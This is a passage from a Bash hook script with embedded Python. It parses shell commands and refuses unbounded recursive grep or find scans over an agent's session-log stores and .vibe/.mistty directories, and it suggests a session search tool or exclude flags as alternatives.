# (any dash token is stepped over, plus the next token for the value-taking flags).
WRAPPERS = {"command", "env", "exec", "nohup", "time", "sudo", "doas"}
WRAPPER_VALUE_FLAGS = {
    "-u", "--user", "-g", "--group", "-p", "--prompt", "-C", "--chdir",
    "-a", "-o", "--output", "-f", "--format", "-S", "--split-string", "--unset",
}


def flat(field):
    """One TSV field. Collapses every whitespace run, so a crafted argument carrying a
    tab or a newline cannot forge an extra field or an extra row."""
    return " ".join(str(field).split())


def verb_at(seg):
    """(effective verb, index of its first argument) for one segment, stepping group
    openers, reserved words, assignments and wrapper prefixes, exactly as
    writ-worktree-safety.sh does: `(grep -r n .vibe)` and `FOO=1 sudo grep -r n .vibe`
    both resolve the verb `grep`."""
    i = 0
    while i < len(seg):
        raw = strip_group_opener(seg[i])
        if raw in GROUP_VERB_TOKENS:
            i += 1
            continue
        tok = dequote(raw)
        if ASSIGNMENT.match(tok):
            i += 1
            continue
        name = os.path.basename(tok[1:] if tok.startswith("\\") else tok)
        if name not in WRAPPERS:
            return name, i + 1
        i += 1
        while i < len(seg):
            nxt = dequote(seg[i])
            if ASSIGNMENT.match(nxt):
                i += 1
                continue
            if nxt == "--":
                i += 1
                break
            if not nxt.startswith("-") or nxt == "-":
                break
            i += 1
            if nxt in WRAPPER_VALUE_FLAGS:
                i += 1
    return "", len(seg)


# ── The target side: where a deep scan lands ───────────────────────────────

CWD = os.environ.get("WRIT_CWD") or os.getcwd()
VIBE_HOME = os.environ.get("VIBE_HOME", "")
DEEP_COMPONENTS = (".vibe", ".mistty")

# grep short flags whose VALUE rides on the next token when the letter ends the
# cluster (`-re PATTERN`): the trailing letter owns the value, standard getopt shape.
GREP_SHORT_VALUE_LAST = frozenset("eEfFPbABCm")
# grep long flags that take their value on the next token rather than after `=`.
GREP_LONG_VALUE_FLAGS = frozenset({
    "--exclude", "--exclude-dir", "--exclude-from", "--include",
    "--include-from", "--file", "--label", "--directories",
    "--after-context", "--before-context", "--context", "--max-count",
    "--regexp", "--color", "--colour", "--line-buffered",
})
# find OPTIONS (before the path list) whose value rides on the next token.
FIND_VALUE_OPTIONS = frozenset({"-maxdepth", "-D", "-O"})


def classify(expanded):
    # "store", "tree" or "" for one expanded target: where the scan lands.
    #
    # Shape only, never a stat call: the same command must be judged the same way
    # whether the target exists yet or not, and the tests pin nonexistent spellings
    # on purpose. The STORE rules run FIRST because both homes' stores sit under a
    # `.vibe`/`.mistty` component: the remedy for a store is the session_search tool,
    # and the remedy for a tree is the exclude flags, so the order decides the advice.
    # A `logs/session` suffix after the component is a session store in EITHER home
    # ($VIBE_HOME only names the running one, and the whole point of search_homes is
    # that the other home's store is just as greppable a target); $VIBE_HOME/logs/session
    # adds a custom home; a bare `.` resolves against WRIT_CWD, which is how a recursive
    # scan of a deep cwd is caught with no operand at all.
    abs_path = expanded if os.path.isabs(expanded) else os.path.join(CWD, expanded)
    parts = [p for p in abs_path.split(os.sep) if p not in ("", ".")]
    for i, part in enumerate(parts[:-2]):
        if part in DEEP_COMPONENTS and parts[i + 1] == "logs" and parts[i + 2] == "session":
            return "store"
    if VIBE_HOME:
        store = os.path.join(os.path.expanduser(VIBE_HOME), "logs", "session")
        try:
            if os.path.commonpath([abs_path, store]) == store:
                return "store"
        except ValueError:
            pass
    if any(p in DEEP_COMPONENTS for p in parts):
        return "tree"
    return ""


def judge_grep(seg, arg0):
    """The deep targets of one `grep` segment, or [] when the scan is bounded, not
    recursive, or aimed outside the trees."""
    recursive = False
    excluded = False
    pattern_from_flag = False
    operands = []
    flags_done = False
    i = arg0
    while i < len(seg):
        a = dequote(seg[i])
        if not flags_done and a == "--":
            flags_done = True
        elif not flags_done and a.startswith("-") and a != "-":
            if a == "--recursive":
                recursive = True
            elif a.startswith("--exclude-dir"):
                # The ONE bounding flag the issue names: --exclude-dir=GLOB or the
                # two-token spelling both mean the walk skips those subtrees.
                excluded = True
                if "=" not in a:
                    i += 1
            elif a in GREP_LONG_VALUE_FLAGS:
                if a in ("--regexp", "--file"):
                    pattern_from_flag = True
                i += 1
            elif not a.startswith("--"):
                letters = a[1:]
                if "r" in letters or "R" in letters:
                    recursive = True
                if letters and letters[-1] in GREP_SHORT_VALUE_LAST:
                    if letters[-1] in ("e", "f"):
                        pattern_from_flag = True
                    i += 1
        else:
            operands.append(seg[i])
        i += 1
    if not recursive or excluded:
        return []
    if not pattern_from_flag and operands:
        operands = operands[1:]   # without -e/--regexp the FIRST operand is the PATTERN
    deep = []
    for raw in operands:
        value, _unresolved = expand_word(strip_unbalanced_close(raw))
        kind = classify(value)
        if kind:
            deep.append((kind, value))
    return deep


def judge_find(seg, arg0):
    """The deep targets of one `find` segment, or [] when the walk is pruned or aimed
    outside the trees. find walks by nature, so there is no recursive flag: the
    bounding is `-prune` or `-path` anywhere in the expression."""
    bounded = False
    paths = []
    i = arg0
    in_paths = False
    while i < len(seg):
        a = dequote(seg[i])
        if not in_paths:
            if a.startswith("-") and a != "-":
                if a in FIND_VALUE_OPTIONS:
                    i += 1   # the option's own value
                i += 1
                continue
            in_paths = True
        if a.startswith("-") and a != "-":
            in_paths = False   # the expression begins; the path list is closed
        if not in_paths:
            if a == "-prune" or a.startswith("-path") or a.startswith("-ipath"):
                bounded = True
        else:
            paths.append(seg[i])
        i += 1
    if bounded:
        return []
    # `find -name x` with no path operand scans `.`, the invoking cwd: classify it
    # against WRIT_CWD so a deep cwd is caught with no operand named at all.
    if not paths:
        paths = ["."]
    deep = []
    for raw in paths:
        value, _unresolved = expand_word(strip_unbalanced_close(raw))
        kind = classify(value)
        if kind:
            deep.append((kind, value))
    return deep


def reason_for(deep):
    targets = ", ".join(flat(value) for _kind, value in deep)
    kinds = {kind for kind, _value in deep}
    parts = [
        "ENF-PROC-GREP-001: Refusing this command: it recursively scans "
        + targets
        + ", a session store or .vibe/.mistty tree whose raw JSONL, worktrees and virtualenvs are gigabytes"
        + " (session c1a56bcc hit the 300s timeout this way and never found its session)."
    ]
    if "store" in kinds:
        parts.append(
            "Use the vibe.session_search tool instead: search finds sessions by words "
            "that were said, list browses them, read returns a session's text, across "
            "every configured home."
        )
    if "tree" in kinds:
        parts.append(
            "Bound the scan first if you truly mean to walk it: "
            "--exclude-dir=.venv --exclude-dir=target --exclude-dir=worktrees on grep, "
            "-prune or -path on find."
        )
    return " ".join(parts)


# Segments are built on the CONTROL set; a BARE group closer is syntax and never
# becomes an operand, exactly as in writ-worktree-safety.sh.
segments, cur = [], []
for t in tokens:
    if t in CONTROL:
        if cur:
            segments.append(cur)
        cur = []
    elif t in GROUP_CLOSER_TOKENS:
        continue
    else:
        cur.append(t)
if cur:
    segments.append(cur)

for seg in segments:
    if not seg:
        continue
    verb, arg0 = verb_at(seg)
    if verb == "grep":
        deep = judge_grep(seg, arg0)
    elif verb == "find":
        deep = judge_find(seg, arg0)
    else:
        continue
    if deep:
        print("deny\t%s\t%s" % (flat(deep[0][1]), flat(reason_for(deep))))
        break   # the FIRST offending segment decides the refusal the agent reads

# LAST LINE, unconditionally, on every completed path above.
print(STATUS_COMPLETE)
PY
)

# THREE OUTCOMES, NOT TWO, for the same reason as writ-worktree-safety.sh: silence
# must mean "nothing this gate guards was found", never "the checker did not run".
_VERDICT_LAST="${VERDICT##*$'\n'}"
if [ "$_VERDICT_LAST" != "$WRIT_EXTRACTOR_SENTINEL" ]; then
    writ_decider_fault "writ-bash-grep-guard" "grep-target-check" \
        "the grep target check did not finish, so this command was not checked for an unbounded recursive scan over a session store or a .vibe/.mistty tree"
    exit 0
fi
VERDICT="${VERDICT%"$_VERDICT_LAST"}"
VERDICT="${VERDICT%$'\n'}"

[ -z "$VERDICT" ] && exit 0

IFS=$'\t' read -r GG_DECISION GG_TARGET GG_REASON <<< "$VERDICT"

# One row, one decision: the extractor prints only denials, so there is no allow arm
# to log here -- an ordinary recursive grep outside the trees is silence by design,
# not an audit row.
if [ "$GG_DECISION" = "deny" ]; then
    log_gate_decision "grep-guard" "deny" "$GG_REASON" "${GG_TARGET:-}"
    emit_deny "$GG_REASON"
fi
exit 0
